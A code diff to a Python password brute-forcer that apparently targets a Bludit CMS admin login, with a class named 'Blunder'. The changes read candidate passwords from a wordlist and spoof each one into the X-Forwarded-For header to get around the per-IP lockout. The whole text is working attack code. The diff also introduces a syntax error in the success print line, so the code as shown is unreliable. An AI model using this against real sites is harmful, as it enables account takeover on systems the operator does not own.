@@ -11,18 +11,22 @@ def request_csrf_token(session, url):
   return match.group(1) if match else None
 
 
-def attempt_login(password, session, url):
+def attempt_login(password, session, url, username):
   try:
     login_url = "%s/admin/login" % url
     token = request_csrf_token(session, login_url)
-    headers = {}
+    headers = {
+      'X-Forwarded-For': password,
+      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+      'Referer': login_url
+    }
     data = {
         'tokenCSRF': token,
-        'username': self.username,
+        'username': username,
         'password': password,
         'save': ''
     }
-    resp = self.session.post(login_url,
+    resp = session.post(login_url,
                              headers=headers,
                              data=data,
                              allow_redirects=False)
@@ -55,12 +59,12 @@ class Blunder:
         return pool.terminate()
       if 'location' in ret[0].headers and '/admin/dashboard' in ret[0].headers[
           'location']:
-        print('[+] Success: Password is %s', ret[1])
+        print('[+] Success: Password is %s' ret[1])
         pool.terminate()
 
-    for password in range(10):
+    for password in self.words:
       pool.apply_async(attempt_login,
-                       args=[password, self.session, self.url],
+                       args=[password, self.session, self.url, self.username],
                        callback=callback)
 
     pool.close()
